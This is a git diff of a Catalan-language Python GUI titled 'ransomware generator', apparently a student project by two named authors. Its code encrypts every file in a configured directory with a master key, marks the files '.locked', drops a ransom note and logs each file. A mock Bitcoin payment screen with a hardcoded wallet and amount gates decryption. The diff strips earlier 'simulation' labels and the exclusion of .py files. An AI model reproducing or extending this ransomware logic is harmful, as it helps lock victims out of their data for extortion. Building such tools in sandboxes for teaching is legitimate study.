@@ -1,12 +1,12 @@
+# -*- coding: utf-8 -*-
 import tkinter as tk
 from tkinter import messagebox, scrolledtext
 import os
 from PIL import Image, ImageTk
 
-
 import crypto_engine
 import file_manager
-import config 
+import config
 
 class AplicacioHacker:
     def __init__(self, finestra):
@@ -34,30 +34,23 @@ class AplicacioHacker:
         self.netejar()
         self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
         self.pantalla.pack(expand=True, fill="both")
-
         contingut = tk.Frame(self.pantalla, bg=self.color_fons)
         contingut.place(relx=0.5, rely=0.5, anchor="center")
 
-       
         if os.path.exists(config.FILE_LOGO):
             try:
-               
                 img_bruta = Image.open(config.FILE_LOGO)
                 img_neta = img_bruta.resize((400, 280), Image.LANCZOS)
                 self.logo_img = ImageTk.PhotoImage(img_neta)
-                
-            
                 tk.Label(contingut, image=self.logo_img, bg=self.color_fons).pack(pady=10)
-            except Exception as e:
-                print(f"Error carregant el logo: {e}")
+            except:
+                pass
 
         tk.Label(contingut, text="GENERADOR DE RANSOMWARE", 
                  fg=self.color_text, bg=self.color_fons, font=("Consolas", 28, "bold")).pack(pady=10)
-        
         tk.Label(contingut, text="MARC FERNANDEZ - MARTI OLIVER", 
                  fg=self.color_text, bg=self.color_fons, font=("Consolas", 16)).pack(pady=5)
-
-        tk.Label(contingut, text="[ PREM ESPAI PER ACCEDIR AL SISTEMA ]", 
+        tk.Label(contingut, text="[ PREM ESPAI PER ACCEDIR ]", 
                  fg="#ffffff", bg=self.color_fons, font=("Consolas", 18)).pack(pady=40)
 
         self.finestra.bind("<space>", self.anar_a_menu)
@@ -75,6 +68,7 @@ class AplicacioHacker:
 
         opcions = [
             ("EXECUTAR INFECCIO", self.accions_infectar),
+            ("SIMULAR PAGAMENT (BTC)", self.pantalla_pagament),
             ("RECUPERAR DADES", self.accions_recuperar),
             ("CONSULTAR LOGS", self.accions_historial),
             ("TANCAR TERMINAL", self.sortida_segura)
@@ -82,7 +76,34 @@ class AplicacioHacker:
 
         for text, comanda in opcions:
             tk.Button(contingut, text=text, width=35, height=2,
-                      bg=self.color_boto, fg=self.color_text, font=("Consolas", 12, "bold"), command=comanda).pack(pady=10)
+                      bg=self.color_boto, fg=self.color_text, 
+                      font=("Consolas", 12, "bold"), command=comanda).pack(pady=10)
+
+    def pantalla_pagament(self):
+        self.netejar()
+        self.pantalla = tk.Frame(self.finestra, bg=self.color_fons)
+        self.pantalla.pack(expand=True, fill="both")
+        contingut = tk.Frame(self.pantalla, bg=self.color_fons)
+        contingut.place(relx=0.5, rely=0.5, anchor="center")
+
+        tk.Label(contingut, text="SISTEMA DE PAGAMENT BTC", fg="#FF9900", bg=self.color_fons, font=("Consolas", 18, "bold")).pack(pady=15)
+        tk.Label(contingut, text="Adreca Wallet:", fg=self.color_text, bg=self.color_fons).pack()
+        self.ent_wallet = tk.Entry(contingut, width=45, bg="#1a1a1a", fg="white")
+        self.ent_wallet.pack(pady=5)
+        tk.Label(contingut, text="Quantitat BTC:", fg=self.color_text, bg=self.color_fons).pack()
+        self.ent_btc = tk.Entry(contingut, width=20, bg="#1a1a1a", fg="white")
+        self.ent_btc.pack(pady=5)
+        tk.Button(contingut, text="[ VERIFICAR ]", bg=self.color_boto, fg=self.color_text, font=("Consolas", 12, "bold"), command=self.validar_pagament).pack(pady=20)
+        tk.Button(contingut, text="[ CANCEL-LAR ]", bg="#330000", fg="white", command=self.pantalla_menu).pack()
+
+    def validar_pagament(self):
+        if self.ent_wallet.get() == "bc1qxy2kgdy6jrsqx7644vvv" and self.ent_btc.get() == "0.5":
+            crypto_engine.generar_i_guardar_clau(config.FILE_KEY)
+            messagebox.showinfo("EXIT", "Pagament confirmat. Clau restablerta.")
+            file_manager.registrar_log("PAGAMENT_OK", "0.5 BTC")
+            self.pantalla_menu()
+        else:
+            messagebox.showerror("ERROR", "Dades incorrectes.")
 
     def crear_consola(self, titol):
         self.netejar()
@@ -100,94 +121,65 @@ class AplicacioHacker:
             self.txt_consola.see(tk.END)
             self.txt_consola.config(state="disabled")
 
-    def sortida_segura(self):
-        if messagebox.askyesno("SORTIDA", "SEGUR QUE VOLS TANCAR?"):
-            self.finestra.quit()
-
-  
     def accions_infectar(self):
-        self.crear_consola("EXECUTANT SIMULACIO DE MALWARE...")
+        self.crear_consola("EXECUTANT INFECCIO...")
         try:
-            target = config.SAND_DIR
-            crypto_engine.generar_i_guardar_clau(config.FILE_KEY)
-            clau = crypto_engine.carregar_clau(config.FILE_KEY)
-            
+            target = os.path.abspath(config.SAND_DIR)
             fitxers = file_manager.llistar_fitxers(target)
-            self.afegir_a_consola(f"DEBUG: Fitxers detectats a la sandbox: {len(fitxers)}")
-            self.afegir_a_consola("Iniciant generacio de clau...")
-            self.finestra.update() 
-            
             comptador = 0
             for f in fitxers:
+                ruta_abs = os.path.abspath(f)
                 nom = os.path.basename(f)
-                if not f.endswith(".locked") and not f.endswith(".py") and "INSTRUCCIONS" not in nom:
-                    crypto_engine.xifrar_arxiu(f, clau)
-                    self.afegir_a_consola(f"SIMULACIO COMPLETADA: {nom} xifrat")
-                    
-                
-                    file_manager.registrar_log("FITXER_XIFRAT", nom)
-                    
-                    comptador += 1
-                    self.finestra.update()
-
-        
+                if not f.endswith(".locked") and "INSTRUCCIONS" not in nom:
+                    if crypto_engine.xifrar_arxiu(ruta_abs, crypto_engine.CLAU_MESTRA):
+                        self.afegir_a_consola(f"BLOQUEJAT: {nom}")
+                        file_manager.registrar_log("FITXER_XIFRAT", nom)
+                        comptador += 1
+                    else:
+                        self.afegir_a_consola(f"ERROR: {nom}")
             file_manager.generar_nota_rescat(target)
-            self.afegir_a_consola(f"\n--- PROCES FINALITZAT AMB EXIT ({comptador} fitxer/s) ---")
-            
+            self.afegir_a_consola(f"\n--- PROCES FINALITZAT ({comptador} fitxers) ---")
         except Exception as e:
             self.afegir_a_consola(f"ERROR: {e}")
 
     def accions_recuperar(self):
-        self.crear_consola("RECUPERANT DADES...")
+        if not os.path.exists(config.FILE_KEY):
+            messagebox.showerror("ERROR", "Cal pagar el rescat primer.")
+            return
+        self.crear_consola("DESXIFRANT DADES...")
         try:
             clau = crypto_engine.carregar_clau(config.FILE_KEY)
-            fitxers = file_manager.llistar_fitxers(config.SAND_DIR)
-            
-            self.afegir_a_consola(f"DEBUG: Fitxers a la sandbox: {len(fitxers)}")
-            self.finestra.update()
-            
+            target = os.path.abspath(config.SAND_DIR)
+            fitxers = file_manager.llistar_fitxers(target)
             comptador = 0
             for f in fitxers:
                 if f.endswith(".locked"):
-                    nom_net = os.path.basename(f)
-                    crypto_engine.desxifrar_arxiu(f, clau)
-                    self.afegir_a_consola(f"RESTAURAT: {nom_net}")
-                    
-             
-                    file_manager.registrar_log("FITXER_DESXIFRAT", nom_net)
-                    
-                    comptador += 1
-                    self.finestra.update()
-
-            self.afegir_a_consola(f"\n--- EXIT: {comptador} fitxer(s) recuperat(s) ---")
+                    ruta_abs = os.path.abspath(f)
+                    if crypto_engine.desxifrar_arxiu(ruta_abs, clau):
+                        self.afegir_a_consola(f"RECUPERAT: {os.path.basename(f)}")
+                        file_manager.registrar_log("FITXER_RECUPERAT", os.path.basename(f))
+                        comptador += 1
+                        self.finestra.update()
+            self.afegir_a_consola(f"\n--- EXIT: {comptador} fitxers recuperats ---")
         except Exception as e:
             self.afegir_a_consola(f"ERROR: {e}")
 
     def accions_historial(self):
-        self.crear_consola("ACCEDINT ALS REGISTRES DEL SISTEMA...")
+        self.crear_consola("LOGS DEL SISTEMA...")
         try:
-       
-            ruta_logs = config.FILE_LOGS
-            
-            if os.path.exists(ruta_logs):
-                with open(ruta_logs, "r", encoding="utf-8") as f:
+            if os.path.exists(config.FILE_LOGS):
+                with open(config.FILE_LOGS, "r", encoding="utf-8") as f:
                     linies = f.readlines()
-                    
-                if not linies:
-                    self.afegir_a_consola("L'historial de registres esta buit.")
-                    return
-
-                self.afegir_a_consola(f"S'han trobat {len(linies)} entrades de registre:\n")
-                self.afegir_a_consola("-" * 60)
-                
-                
                 for linia in reversed(linies):
                     self.afegir_a_consola(f"> {linia.strip()}")
             else:
-                self.afegir_a_consola("ERROR: No s'ha trobat el fitxer de logs a la carpeta data/logs.")
-                
-        except Exception as e:
-            self.afegir_a_consola(f"ERROR al llegir els registres: {e}")
+                self.afegir_a_consola("No hi ha historial.")
+        except:
+            self.afegir_a_consola("Error llegint logs.")
+
+    def sortida_segura(self):
+        if messagebox.askyesno("SORTIDA", "Vols tancar?"):
+            self.finestra.quit()
 
 if __name__ == "__main__":
     root = tk.Tk()
